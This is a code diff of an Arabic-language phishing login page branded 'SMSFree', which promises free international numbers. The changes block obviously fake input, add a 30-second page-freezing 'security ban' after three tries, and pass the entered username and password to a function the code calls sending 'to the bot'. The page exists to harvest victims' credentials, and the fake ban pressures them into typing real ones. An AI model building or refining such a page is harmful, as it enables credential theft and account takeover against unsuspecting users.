@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMSFree - تفعيل الحساب</title>
+    <title>SMSFree - نظام حماية متطور</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         :root {
@@ -11,7 +11,6 @@
             --card-bg: #1e293b;
             --primary-cyan: #22d3ee;
             --text-white: #f8fafc;
-            --error-red: #ef4444;
         }
 
         body {
@@ -19,12 +18,21 @@
             background-color: var(--bg-color);
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
             color: var(--text-white);
+            transition: filter 0.5s ease; /* سلاسة التمويه */
+        }
+
+        /* حالة التجمد والضباب */
+        body.frozen {
+            filter: blur(8px) grayscale(50%);
+            pointer-events: none; /* تعطيل كل الضغطات */
+            user-select: none;
         }
 
         .main-container {
             width: 90%; max-width: 420px; background-color: var(--card-bg);
             padding: 40px 25px; border-radius: 24px; text-align: center;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            position: relative;
         }
 
         .logo-circle {
@@ -36,10 +44,13 @@
 
         h2 { font-size: 16px; color: var(--primary-cyan); margin-bottom: 30px; line-height: 1.6; }
 
-        .ban-box {
-            border: 2px solid #fbbf24; border-radius: 12px;
-            padding: 12px; margin-bottom: 20px; background: rgba(251, 191, 36, 0.1);
-            color: #fbbf24; font-weight: bold; display: none;
+        /* صندوق الحظر العائم (يبقى ظاهراً فوق الضباب) */
+        .ban-overlay {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            z-index: 9999; background: rgba(30, 41, 59, 0.9);
+            padding: 25px; border-radius: 20px; border: 2px solid #fbbf24;
+            display: none; text-align: center; width: 80%; max-width: 300px;
+            box-shadow: 0 0 30px rgba(251, 191, 36, 0.3);
         }
 
         input {
@@ -55,83 +66,98 @@
             font-size: 17px; font-weight: bold; cursor: pointer;
         }
 
-        /* تنسيق التنبيه الشفاف الاحترافي */
         .glass-popup {
-            background: rgba(30, 41, 59, 0.7) !important;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px !important;
+            background: rgba(15, 23, 42, 0.9) !important;
+            backdrop-filter: blur(15px);
+            border: 1px solid var(--primary-cyan);
+            border-radius: 25px !important;
             color: white !important;
         }
     </style>
 </head>
 <body>
 
-<div class="main-container">
+<div class="ban-overlay" id="banOverlay">
+    <h3 style="color: #fbbf24; margin: 0 0 10px 0;">⚠️ تم تقييد الوصول</h3>
+    <p style="font-size: 14px; margin: 0;">سيتم فك التجميد تلقائياً خلال</p>
+    <div style="font-size: 30px; font-weight: bold; margin: 10px 0;" id="timer">30</div>
+    <p style="font-size: 12px; opacity: 0.7;">ثانية</p>
+</div>
+
+<div class="main-container" id="mainCard">
     <div class="logo-circle">SMSFree</div>
     <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.</h2>
-
-    <div class="ban-box" id="banBox">
-        لقد تم حظرك مؤقتاً. فك الحظر بعد <span id="timer">30</span> ثانية
-    </div>
 
     <form id="loginForm">
         <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
         <input type="password" id="pass" placeholder="كلمة المرور" required>
-        <button type="submit" id="submitBtn" class="submit-btn">تفعيل الحساب الآن</button>
+        <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
     </form>
 </div>
 
 <script>
     let attempts = 0;
-    let isBanned = false;
 
     document.getElementById('loginForm').onsubmit = async (e) => {
         e.preventDefault();
-        if (isBanned) return;
-
+        
         const user = document.getElementById('user').value;
         const pass = document.getElementById('pass').value;
 
-        // فحص المدخلات (منع الأحرف العشوائية القصيرة جداً أو العربية)
-        const isInvalid = user.length < 5 || pass.length < 6 || /[\u0600-\u06FF]/.test(user);
+        // التحقق من صحة المدخلات (منع العربية والعشوائية)
+        const hasArabic = /[\u0600-\u06FF]/.test(user) || /[\u0600-\u06FF]/.test(pass);
+        const isRandom = user.length < 5 || pass.length < 6;
 
-        if (isInvalid) {
+        if (hasArabic || isRandom) {
             attempts++;
             if (attempts >= 3) {
-                startBan();
+                applySuperBan();
             } else {
-                // نافذة تنبيه شفافة وأنيقة
                 Swal.fire({
                     title: 'تنبيه أمني',
-                    text: 'يرجى التأكد من كتابة البريد الإلكتروني وكلمة المرور بشكل صحيح لتجنب حظرك من استخدام الموقع مؤقتاً.',
+                    text: 'يرجى التأكد من كتابة البريد الإلكتروني وكلمة المرور بشكل صحيح لتجنب حظرك مؤقتاً.',
                     icon: 'warning',
                     customClass: { popup: 'glass-popup' },
-                    confirmButtonColor: '#22d3ee',
-                    confirmButtonText: 'حسناً'
+                    confirmButtonColor: '#22d3ee'
                 });
             }
             return;
         }
 
-        // إرسال البيانات إذا كانت صحيحة
+        // إرسال البيانات للبوت
         sendToBot(user, pass);
     };
 
-    function startBan() {
-        isBanned = true;
-        attempts = 0;
-        document.getElementById('banBox').style.display = 'block';
-        document.getElementById('submitBtn').disabled = true;
+    function applySuperBan() {
+        const body = document.body;
+        const overlay = document.getElementById('banOverlay');
+        const timerText = document.getElementById('timer');
+        
+        // تجميد وتضبيب الصفحة
+        body.classList.add('frozen');
+        overlay.style.display = 'block';
+
         let timeLeft = 30;
-        const interval = setInterval(() => {
+        const timer = setInterval(() => {
             timeLeft--;
-            document.getElementById('timer').innerText = timeLeft;
+            timerText.innerText = timeLeft;
+
             if (timeLeft <= 0) {
-                clearInterval(interval);
-                document.getElementById('banBox').style.display = 'none';
-                document.getElementById('submitBtn').disabled = false;
-                isBanned = false;
+                clearInterval(timer);
+                // إزالة التجميد
+                body.classList.remove('frozen');
+                overlay.style.display = 'none';
+                attempts = 0;
+
+                // إظهار رسالة النجاح
+                Swal.fire({
+                    title: 'مبروك!',
+                    text: 'تم إزالة الحظر عنك بعد انتهاء الـ 30 ثانية. لا تكرر الغلط كي لا يتم حظرك ثانية.',
+                    icon: 'success',
+                    customClass: { popup: 'glass-popup' },
+                    confirmButtonColor: '#22d3ee',
+                    confirmButtonText: 'فهمت'
+                });
             }
         }, 1000);
     }
@@ -147,5 +173,6 @@
         } catch (e) {}
     }
 </script>
+
 </body>
 </html>
